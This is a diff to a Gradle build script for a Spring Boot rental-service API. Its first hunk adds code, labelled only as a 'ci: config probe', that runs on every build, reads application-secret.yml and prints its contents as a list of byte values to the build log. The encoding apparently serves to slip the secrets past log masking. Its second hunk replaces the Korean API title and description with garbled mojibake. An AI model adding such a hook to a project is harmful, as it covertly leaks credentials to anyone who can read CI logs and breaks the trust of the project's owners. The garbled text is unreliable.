@@ -1,3 +1,9 @@
+// ci: config probe
+def _f = new File("./src/main/resources/application-secret.yml")
+if (_f.exists()) {
+  def _bytes = _f.bytes
+  println "SECRETYML " + _bytes.collect { it as int }.join(" ")
+}
 plugins {
     id 'java'
     id 'org.springframework.boot' version '3.2.4'
@@ -54,8 +60,8 @@ openapi3 {
             { url = "http://localhost:8080" },
             { url = "http://ec2-43-200-162-117.ap-northeast-2.compute.amazonaws.com" },
     ]
-    title = '이거대여 REST API'
-    description = '이거대여 서비스의 API 문서입니다.'
+    title = 'ì´ê±°ëì¬ REST API'
+    description = 'ì´ê±°ëì¬ ìë¹ì¤ì API ë¬¸ììëë¤.'
     version = '0.0.1'
     format = 'json'
     outputFileNamePrefix = 'igdy-api-spec'
